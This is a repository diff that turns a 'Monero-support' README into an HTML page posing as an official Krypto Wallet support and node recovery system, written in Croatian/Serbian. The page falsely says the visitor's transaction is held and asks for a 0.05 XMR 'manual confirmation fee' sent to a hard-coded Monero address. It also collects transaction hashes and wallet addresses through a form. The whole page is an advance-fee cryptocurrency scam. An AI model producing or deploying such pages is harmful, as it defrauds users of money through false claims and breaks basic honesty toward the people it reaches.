@@ -1,1 +1,59 @@
-# Monero-support
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Krypto Wallet - Support</title>
+    <style>
+        body {
+            font-family: sans-serif;
+            margin: 20px;
+            background-color: #f4f4f4;
+        }
+        header {
+            background-color: #292929;
+            color: #ffffff;
+            padding: 20px;
+            text-align: center;
+        }
+        main {
+            padding: 20px;
+        }
+        section {
+            margin-bottom: 20px;
+        }
+    </style>
+</head>
+<body>
+
+    <header>
+        <h1>Mrežna sinkronizacija i razrešenje čvora</h1>
+    </header>
+
+    <main>
+        <section>
+            <h2>Podrška</h2>
+            <p>Vaša transakcija je trenutno zadržana zbog mrežne naknade. Za dovršetak sinkronizacije, potrebna je ručna potvrda.</p>
+            <p><strong>Važno:</strong> Zahtijevana naknada za ručnu potvrdu iznosi: 0.05 XMR na adresu: <code>473uPF5QtU2HPksASuLLQrVpQF7afHhFBPsnrHpWBcs4i1msqUJSgV5GEHLoXGN4f7RbXBsoaRNLgEFTJdyPiWoCRKZ81iX</code></p>
+            <p>Kliknite 'Pokreni ponovnu sinkronizaciju'!</p>
+        </section>
+
+        <section>
+            <form>
+                <label for="id">ID Transakcije (Hash):</label><br>
+                <input type="text" id="id" name="id" required style="width:100%; margin-bottom:10px;"><br>
+                
+                <label for="address">Adresa Novčanika za Povrat:</label><br>
+                <input type="text" id="address" name="address" required style="width:100%; margin-bottom:10px;"><br>
+                
+                <button type="submit">Pokreni ponovnu sinkronizaciju</button>
+            </form>
+        </section>
+    </main>
+
+    <footer>
+        <p><small>Službeni sustav za oporavak čvorova.</small></p>
+    </footer>
+
+</body>
+</html>
